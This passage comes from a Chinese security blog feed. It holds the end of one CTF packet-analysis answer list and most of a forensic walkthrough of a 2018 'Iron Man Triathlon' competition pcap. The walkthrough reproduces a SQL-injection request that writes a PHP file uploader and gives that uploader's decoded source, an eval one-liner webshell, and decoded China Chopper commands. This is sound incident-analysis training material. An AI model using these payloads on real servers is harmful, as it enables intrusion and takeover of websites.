Read&quot;</span>);&#125;;echo(<span class="hljs-string">&quot;|&lt;-&quot;</span>);die();<br></code></pre></td></tr></table></figure><p>后面第十个数据包基本上就是那个文件的传输过程了</p><h2 id="4-最后答案"><a href="#4-最后答案" class="headerlink" title="4. 最后答案"></a>4. 最后答案</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">1</span>.黑客攻击的第一个受害主机的网卡IP地址<br><span class="hljs-number">192.168.1.8</span><br><span class="hljs-number">2</span>.黑客对URL的哪一个参数实施了SQL注入<br>list<span class="hljs-string">[select]</span><br><span class="hljs-number">3</span>.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)<br>ajtuc_<br><span class="hljs-number">4</span>.第一个受害主机网站数据库的名字<br>joomla<br><span class="hljs-number">5</span>.Joomla后台管理员的密码是多少<br>跳过...<br><span class="hljs-number">6</span>.黑客第一次获得的php木马的密码是什么<br>zzz<br><span class="hljs-number">7</span>.黑客第二次上传php木马是什么时间<br><span class="hljs-number">17</span>:<span class="hljs-number">20</span>:<span class="hljs-number">44</span>.<span class="hljs-number">248365</span><br><span class="hljs-number">8</span>.第二次上传的木马通过HTTP协议中的哪个头传递数据<br>HTTP_REFERER<br><span class="hljs-number">9</span>.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)<br>admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4<br><span class="hljs-number">10</span>.php代理第一次被使用时最先连接了哪个IP地址<br><span class="hljs-number">4.2.2.2</span><br><span class="hljs-number">11</span>.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br><span class="hljs-number">10</span>:<span class="hljs-number">36</span>:<span class="hljs-number">59</span>.<span class="hljs-number">770782</span><br><span class="hljs-number">12</span>.黑客在内网主机中添加的用户名和密码是多少<br>kaka:kaka<br><span class="hljs-number">13</span>.黑客从内网服务器中下载下来的文件名<br>lsass.exe_180208_185247.dmp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>数据包分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018.6.1-铁人三项赛数据赛数据包分析</title>
    <link href="/2018/11/29/2018-6-1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <url>/2018/11/29/2018-6-1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>6月1号 信息安全铁人三项赛分区赛数据包分析练习</p><a id="more"></a><h2 id="1-数据包下载链接"><a href="#1-数据包下载链接" class="headerlink" title="1. 数据包下载链接"></a>1. 数据包下载链接</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">链接: https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>p2bxf-R6LE5BuaLAzpIbfQ 提取码: ezpw <br>解压密码: t3sec.org.cn<br></code></pre></td></tr></table></figure><h2 id="2-题目"><a href="#2-题目" class="headerlink" title="2. 题目"></a>2. 题目</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.被攻击的两个服务器的内网ip分别是多少，以下简称服务器<span class="hljs-number">1</span>和<span class="hljs-number">2</span>(格式：空格分隔，按黑客攻击顺序排列）  <br><span class="hljs-attribute">2</span>.两台服务器的主机名分别是什么  <br><span class="hljs-attribute">3</span>.黑客使用了什么工具对服务器<span class="hljs-number">1</span>进行的攻击(小写)  <br><span class="hljs-attribute">4</span>.黑容成功登陆网站后台的账号密码以及验证码是什么(格式user/pass/vcode)  <br><span class="hljs-attribute">5</span>.黑客向服务器<span class="hljs-number">1</span>写入webshell的具体命令是什么(url解码后)  <br><span class="hljs-attribute">6</span>.服务器<span class="hljs-number">1</span>都开启了哪些允许外连的TCP注册端口(端口号从小到大，用空格间隔)  <br><span class="hljs-attribute">7</span>.服务器<span class="hljs-number">1</span>安装的修补程序名称  <br><span class="hljs-attribute">8</span>.网站根目录的绝对路径(注意：大写，左斜杠，最后要有一个斜杠)  <br><span class="hljs-attribute">9</span>.黑客使用什么命令或文件进行的内网扫描  <br><span class="hljs-attribute">10</span>.扫描结果中服务器<span class="hljs-number">2</span>开放了哪些端口(端口号从小到大，用空格隔开)  <br><span class="hljs-attribute">11</span>.黑客执行的什么命令将administrator的密码保存到文件中  <br><span class="hljs-attribute">12</span>.服务器<span class="hljs-number">1</span>的系统管理员administrator的密码是什么  <br><span class="hljs-attribute">13</span>.黑客进行内外扫描的ip范围(格式:xx.xx.xx.xx~xx.xx.xx.xx)  <br><span class="hljs-attribute">14</span>.服务器<span class="hljs-number">1</span>的mysql的root用户的密码是什么  <br><span class="hljs-attribute">15</span>.黑客在服务器<span class="hljs-number">2</span>中查看了哪个敏感文件(拿到shell之后)，请写出绝对路径  <br><span class="hljs-attribute">16</span>.服务器<span class="hljs-number">2</span>的web网站后台账号密码(格式:账号/密码)  <br><span class="hljs-attribute">17</span>.黑客在redis未授权访问中反弹shell的ip和端口是多少  <br><span class="hljs-attribute">18</span>.黑客拿到root权限后执行的第二条命令是什么  <br><span class="hljs-attribute">19</span>.服务器<span class="hljs-number">2</span>的root用户密码是什么  <br><span class="hljs-attribute">20</span>.黑客向服务器<span class="hljs-number">2</span>写入webshell的命令  <br><span class="hljs-attribute">21</span>.pcap中哪些ip发送过无偿ARP包(空格分隔，时间顺序排序)<br></code></pre></td></tr></table></figure><h2 id="3-数据包分析过程"><a href="#3-数据包分析过程" class="headerlink" title="3. 数据包分析过程"></a>3. 数据包分析过程</h2><p>根据题干，黑客应该是攻击了网站。</p><p>打开第一个数据包，过滤http</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">http</span><br></code></pre></td></tr></table></figure><p>有很多异常请求，对其进行URL解码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/about.php?<span class="hljs-attribute">listid</span>=6) <span class="hljs-keyword">AND</span> <span class="hljs-attribute">5682</span>=5682 <span class="hljs-keyword">AND</span> (<span class="hljs-attribute">8782</span>=8782<br></code></pre></td></tr></table></figure><p>很明显进行了SQL注入</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>根据<code>User-Agent</code>，可知黑客使用的工具是<code>SQLMap</code>。</p><p>黑客的IP是<code>202.1.1.2</code>，被攻击主机的内网IP是<code>192.168.1.74</code>。</p><p>使用过滤规则</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">202</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第一个数据包一直到结尾都在注入数据，打开第二个数据包。</p><p>在SQL注入结束，<code>No.74459</code>之后有很多<code>HEAD</code>请求，猜测黑客在爆破后台登录路径之类的东西。</p><p>在往后翻，找到<code>GET</code>请求，根据数据包访问的顺序，猜测黑客在<code>login.php</code>输入了账号密码验证码，成功进入了后台。</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/2.png" alt="2"></p><p>分别追踪TCP数据流</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/3.png" alt="3"></p><p>根据响应，判断黑客成功登录了后台，所以<code>user/pass/vcode</code>为</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">UserName=admin<span class="hljs-variable">&amp;</span>Password=adminlwphp<span class="hljs-variable">&amp;</span>Code=WD7x<br>admin<span class="hljs-meta-keyword">/adminlwphp/</span>WD7x<br></code></pre></td></tr></table></figure><p>往后分析，黑客登录后台后，通过SQL注入，写了一个可上传文件的马。<br><code>No.426570</code></p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/4.png" alt="4"></p><p>url解码后的请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /about.php?listid=-<span class="hljs-number">8272</span> OR <span class="hljs-number">9096</span>=<span class="hljs-number">9096</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span> INTO OUTFILE &#x27;/WWW/tmpuaezh.php&#x27; LINES TERMINATED BY <span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">3</span>f<span class="hljs-number">7068700</span>a<span class="hljs-number">69662028697373657428245</span>f<span class="hljs-number">524551554553545</span>b<span class="hljs-number">2275706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">6164225</span>d<span class="hljs-number">29297</span>b<span class="hljs-number">246469723</span>d<span class="hljs-number">245</span>f<span class="hljs-number">524551554553545</span>b<span class="hljs-number">2275706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">6164446972225</span>d<span class="hljs-number">3</span>b<span class="hljs-number">6966202870687076657273696</span>f<span class="hljs-number">6</span>e<span class="hljs-number">28293</span>c<span class="hljs-number">27342</span>e<span class="hljs-number">312</span>e<span class="hljs-number">3027297</span>b<span class="hljs-number">2466696</span>c<span class="hljs-number">653</span>d<span class="hljs-number">24485454505</span>f<span class="hljs-number">504</span>f<span class="hljs-number">53545</span>f<span class="hljs-number">46494</span>c<span class="hljs-number">45535</span>b<span class="hljs-number">2266696</span>c<span class="hljs-number">65225</span>d<span class="hljs-number">5</span>b<span class="hljs-number">226</span>e<span class="hljs-number">616</span>d<span class="hljs-number">65225</span>d<span class="hljs-number">3</span>b<span class="hljs-number">406</span>d<span class="hljs-number">6</span>f<span class="hljs-number">76655</span>f<span class="hljs-number">75706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">616465645</span>f<span class="hljs-number">66696</span>c<span class="hljs-number">652824485454505</span>f<span class="hljs-number">504</span>f<span class="hljs-number">53545</span>f<span class="hljs-number">46494</span>c<span class="hljs-number">45535</span>b<span class="hljs-number">2266696</span>c<span class="hljs-number">65225</span>d<span class="hljs-number">5</span>b<span class="hljs-number">22746</span>d<span class="hljs-number">705</span>f<span class="hljs-number">6</span>e<span class="hljs-number">616</span>d<span class="hljs-number">65225</span>d<span class="hljs-number">2</span>c<span class="hljs-number">246469722</span>e<span class="hljs-number">222</span>f<span class="hljs-number">222</span>e<span class="hljs-number">2466696</span>c<span class="hljs-number">6529206</span>f<span class="hljs-number">722064696528293</span>b<span class="hljs-number">7</span>d<span class="hljs-number">656</span>c<span class="hljs-number">73657</span>b<span class="hljs-number">2466696</span>c<span class="hljs-number">653</span>d<span class="hljs-number">245</span>f<span class="hljs-number">46494</span>c<span class="hljs-number">45535</span>b<span class="hljs-number">2266696</span>c<span class="hljs-number">65225</span>d<span class="hljs-number">5</span>b<span class="hljs-number">226</span>e<span class="hljs-number">616</span>d<span class="hljs-number">65225</span>d<span class="hljs-number">3</span>b<span class="hljs-number">406</span>d<span class="hljs-number">6</span>f<span class="hljs-number">76655</span>f<span class="hljs-number">75706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">616465645</span>f<span class="hljs-number">66696</span>c<span class="hljs-number">6528245</span>f<span class="hljs-number">46494</span>c<span class="hljs-number">45535</span>b<span class="hljs-number">2266696</span>c<span class="hljs-number">65225</span>d<span class="hljs-number">5</span>b<span class="hljs-number">22746</span>d<span class="hljs-number">705</span>f<span class="hljs-number">6</span>e<span class="hljs-number">616</span>d<span class="hljs-number">65225</span>d<span class="hljs-number">2</span>c<span class="hljs-number">246469722</span>e<span class="hljs-number">222</span>f<span class="hljs-number">222</span>e<span class="hljs-number">2466696</span>c<span class="hljs-number">6529206</span>f<span class="hljs-number">722064696528293</span>b<span class="hljs-number">7</span>d<span class="hljs-number">4063686</span>d<span class="hljs-number">6</span>f<span class="hljs-number">6428246469722</span>e<span class="hljs-number">222</span>f<span class="hljs-number">222</span>e<span class="hljs-number">2466696</span>c<span class="hljs-number">652</span>c<span class="hljs-number">30373535293</span>b<span class="hljs-number">6563686</span>f<span class="hljs-number">202246696</span>c<span class="hljs-number">652075706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">61646564223</span>b<span class="hljs-number">7</span>d<span class="hljs-number">656</span>c<span class="hljs-number">7365207</span>b<span class="hljs-number">6563686</span>f<span class="hljs-number">20223</span>c<span class="hljs-number">666</span>f<span class="hljs-number">726</span>d<span class="hljs-number">20616374696</span>f<span class="hljs-number">6</span>e<span class="hljs-number">3</span>d<span class="hljs-number">222</span>e<span class="hljs-number">245</span>f<span class="hljs-number">5345525645525</span>b<span class="hljs-number">225048505</span>f<span class="hljs-number">53454</span>c<span class="hljs-number">46225</span>d<span class="hljs-number">2</span>e<span class="hljs-number">22206</span>d<span class="hljs-number">6574686</span>f<span class="hljs-number">643</span>d<span class="hljs-number">504</span>f<span class="hljs-number">535420656</span>e<span class="hljs-number">63747970653</span>d<span class="hljs-number">6</span>d<span class="hljs-number">756</span>c<span class="hljs-number">7469706172742</span>f<span class="hljs-number">666</span>f<span class="hljs-number">726</span>d<span class="hljs-number">2</span>d<span class="hljs-number">646174613</span>e<span class="hljs-number">3</span>c<span class="hljs-number">696</span>e<span class="hljs-number">70757420747970653</span>d<span class="hljs-number">68696464656</span>e<span class="hljs-number">206</span>e<span class="hljs-number">616</span>d<span class="hljs-number">653</span>d<span class="hljs-number">4</span>d<span class="hljs-number">41585</span>f<span class="hljs-number">46494</span>c<span class="hljs-number">455</span>f<span class="hljs-number">53495</span>a<span class="hljs-number">452076616</span>c<span class="hljs-number">75653</span>d<span class="hljs-number">313030303030303030303</span>e<span class="hljs-number">3</span>c<span class="hljs-number">623</span>e<span class="hljs-number">73716</span>c<span class="hljs-number">6</span>d<span class="hljs-number">61702066696</span>c<span class="hljs-number">652075706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">616465723</span>c<span class="hljs-number">2</span>f<span class="hljs-number">623</span>e<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e<span class="hljs-number">3</span>c<span class="hljs-number">696</span>e<span class="hljs-number">707574206</span>e<span class="hljs-number">616</span>d<span class="hljs-number">653</span>d<span class="hljs-number">66696</span>c<span class="hljs-number">6520747970653</span>d<span class="hljs-number">66696</span>c<span class="hljs-number">653</span>e<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e<span class="hljs-number">746</span>f<span class="hljs-number">206469726563746</span>f<span class="hljs-number">72793</span>a<span class="hljs-number">203</span>c<span class="hljs-number">696</span>e<span class="hljs-number">70757420747970653</span>d<span class="hljs-number">74657874206</span>e<span class="hljs-number">616</span>d<span class="hljs-number">653</span>d<span class="hljs-number">75706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">61644469722076616</span>c<span class="hljs-number">75653</span>d<span class="hljs-number">5</span>c<span class="hljs-number">5</span>c<span class="hljs-number">5757575</span>c<span class="hljs-number">5</span>c<span class="hljs-number">3</span>e<span class="hljs-number">203</span>c<span class="hljs-number">696</span>e<span class="hljs-number">70757420747970653</span>d<span class="hljs-number">7375626</span>d<span class="hljs-number">6974206</span>e<span class="hljs-number">616</span>d<span class="hljs-number">653</span>d<span class="hljs-number">75706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">61642076616</span>c<span class="hljs-number">75653</span>d<span class="hljs-number">75706</span>c<span class="hljs-number">6</span>f<span class="hljs-number">61643</span>e<span class="hljs-number">3</span>c<span class="hljs-number">2</span>f<span class="hljs-number">666</span>f<span class="hljs-number">726</span>d<span class="hljs-number">3</span>e<span class="hljs-number">223</span>b<span class="hljs-number">7</span>d<span class="hljs-number">3</span>f<span class="hljs-number">3</span>e<span class="hljs-number">0</span>a-- -- IYtW <br><br></code></pre></td></tr></table></figure><p>16进制编码的是要写的代码。解码后美化一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;uploadDir&quot;</span>];<br>    <span class="hljs-keyword">if</span> (phpversion() &lt; <span class="hljs-string">&#x27;4.1.0&#x27;</span>) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$HTTP_POST_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        @move_uploaded_file(<span class="hljs-variable">$HTTP_POST_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$dir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$file</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        @move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$dir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$file</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<br>    &#125;<br>    @chmod(<span class="hljs-variable">$dir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$file</span>, <span class="hljs-number">0755</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File uploaded&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;form action=&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;PHP_SELF&quot;</span>] . <span class="hljs-string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=\\WWW\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>再往下走，可以了解到，黑客使用SQL注入写入了一个能够上传文件的马，名为<code>tmpuaezh.php</code><br>然后上传了一个可以执行命令的马，名为<code>tmpbjhbf.php</code>。最后执行命令在Web目录下写了一个名为<code>abc.php</code>的一句话木马</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/5.png" alt="5"></p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/6.png" alt="6"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /tmpbjhbf.php?cmd=echo%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">5</span>E%<span class="hljs-number">20</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bge%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">5</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Eabc.php<br></code></pre></td></tr></table></figure><p>解码得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span>^ <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[ge]);?^&gt;&gt;abc.php<br></code></pre></td></tr></table></figure><p>从<code>No.481222</code>个数据包往后，<code>HTTP</code>请求类型为<code>POST</code>，很明显黑客使用菜刀连接上了<code>abc.php</code>这个一句话木马，并且执行了命令<br>分别进行分析</p><p><img src="https://image.mengsec.com/2018.6.1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/7.png" alt="7"></p><p><code>No.481222-No.481224</code></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">ge</span>=@eval<span class="hljs-comment">(/*12345*/base64_decode($_POST[z0])</span>);<br>&amp;z<span class="hljs-number">0</span>=QGluaV<span class="hljs-number">9</span>zZXQoImRpc<span class="hljs-number">3</span>BsYXlfZXJyb<span class="hljs-number">3</span>JzIiwiMCIp<span class="hljs-meta">O0</span>BzZXRfdGltZV<span class="hljs-number">9</span>saW<span class="hljs-number">1</span>pdCgwKTtAc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">21</span>hZ<span class="hljs-number">2</span>ljX<span class="hljs-number">3</span>F<span class="hljs-number">1</span>b<span class="hljs-number">3</span>Rlc<span class="hljs-number">19</span>ydW<span class="hljs-number">50</span>aW<span class="hljs-number">1</span>lKDAp<span class="hljs-meta">O2</span>Vja<span class="hljs-name">G8</span>oIi<span class="hljs-number">0</span>+fCIpOzskRD<span class="hljs-number">1</span>kaXJuYW<span class="hljs-number">1</span>lKCRfU<span class="hljs-number">0</span><span class="hljs-attr">VSVkVSWyJTQ1</span>JJUFRfRklMRU<span class="hljs-number">5</span>BTUUiXSk<span class="hljs-number">7</span>aWYoJEQ<span class="hljs-number">9</span>PSIiKSREPWRpc<span class="hljs-name">m5</span>hbWUoJF<span class="hljs-number">9</span>TRVJWRVJbIlBBVEhfVFJBTl<span class="hljs-symbol">NMQVRFRCJdKTskUj0</span>ieyREfVx<span class="hljs-number">0</span>IjtpZihzdWJzdHIoJEQsMCwxKSE<span class="hljs-number">9</span>Ii<span class="hljs-number">8</span>iKXtmb<span class="hljs-number">3</span>JlYW<span class="hljs-symbol">NoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2</span>RpcigieyRMfToiKSkkUi<span class="hljs-number">49</span>I<span class="hljs-symbol">nskTH06</span>Ijt<span class="hljs-number">9</span>JFIuPSJcdCI<span class="hljs-number">7</span>JHU<span class="hljs-number">9</span>KGZ<span class="hljs-number">1</span>bm<span class="hljs-symbol">N0</span>aW<span class="hljs-number">9</span>uX<span class="hljs-number">2</span>V<span class="hljs-number">4</span>aX<span class="hljs-symbol">N0</span>cyg<span class="hljs-symbol">ncG9</span>zaXhfZ<span class="hljs-number">2</span>V<span class="hljs-number">0</span>ZWdpZCcpKT<span class="hljs-number">9</span>Ac<span class="hljs-name">G9</span>zaXhfZ<span class="hljs-number">2</span>V<span class="hljs-number">0</span>cHd<span class="hljs-number">1</span>aWQoQHB<span class="hljs-attr">vc2</span>l<span class="hljs-number">4</span>X<span class="hljs-number">2</span>dldGV<span class="hljs-number">1</span>aWQoKSk<span class="hljs-number">6</span>Jyc<span class="hljs-number">7</span>JHVzcj<span class="hljs-number">0</span>oJHUpPyR<span class="hljs-number">1</span>WyduYW<span class="hljs-number">1</span>lJ<span class="hljs-number">106</span>QGdldF<span class="hljs-number">9</span>jdXJyZW<span class="hljs-number">50</span>X<span class="hljs-number">3</span>VzZXIoKTskUi<span class="hljs-number">49</span>cGhwX<span class="hljs-number">3</span>VuYW<span class="hljs-number">1</span>lKCk<span class="hljs-number">7</span>JFIuPSIoeyR<span class="hljs-number">1</span>c<span class="hljs-number">3</span>J<span class="hljs-number">9</span>KSI<span class="hljs-number">7</span>cHJpb<span class="hljs-symbol">nQgJFI7</span><span class="hljs-meta">O2</span>Vja<span class="hljs-name">G8</span>oI<span class="hljs-symbol">nw8</span>LSIp<span class="hljs-meta">O2</span>RpZSgpOw==<br></code></pre></td></tr></table></figure><p>解码得</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">@ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);@set_time_limit(<span class="hljs-number">0</span>);@set_magic_quotes_runtime(<span class="hljs-number">0</span>);echo(<span class="hljs-string">&quot;-&gt;|&quot;</span>);;$D=dirname($_SERVER[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="hljs-keyword">if</span>($D==<span class="hljs-string">&quot;&quot;</span>)$D=dirname($_SERVER[<span class="hljs-string">&quot;PATH_TRANSLATED&quot;</span>]);$R=<span class="hljs-string">&quot;&#123;$D&#125;\t&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">substr</span>($D,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;/&quot;</span>)&#123;<span class="hljs-keyword">foreach</span>(range(<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>) as $L)<span class="hljs-keyword">if</span>(is_dir(<span class="hljs-string">&quot;&#123;$L&#125;:&quot;</span>))$R.=<span class="hljs-string">&quot;&#123;$L&#125;:&quot;</span>;&#125;$R.=<span class="hljs-string">&quot;\t&quot;</span>;$u=(function_exists(<span class="hljs-string">&#x27;posix_getegid&#x27;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="hljs-string">&#x27;&#x27;</span>;$usr=($u)?$u[<span class="hljs-string">&#x27;name&#x27;</span>]:@get_current_user();$R.=php_uname();$R.=<span class="hljs-string">&quot;(&#123;$usr&#125;)&quot;</span>;<span class="hljs-keyword">print</span> $R;;echo(<span class="hljs-string">&quot;|&lt;-&quot;</span>);<span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><p>根据响应包</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">-&gt;|C:/WWW</span><span class="hljs-attr">C:</span><span class="hljs-string">Windows</span> <span class="hljs-string">NT</span> <span class="hljs-string">TEST-7E28AF8836</span> <span class="hljs-number">5.2</span> <span class="hljs-string">build</span> <span class="hljs-number">3790</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2003 </span><span class="hljs-string">Enterprise</span> <span 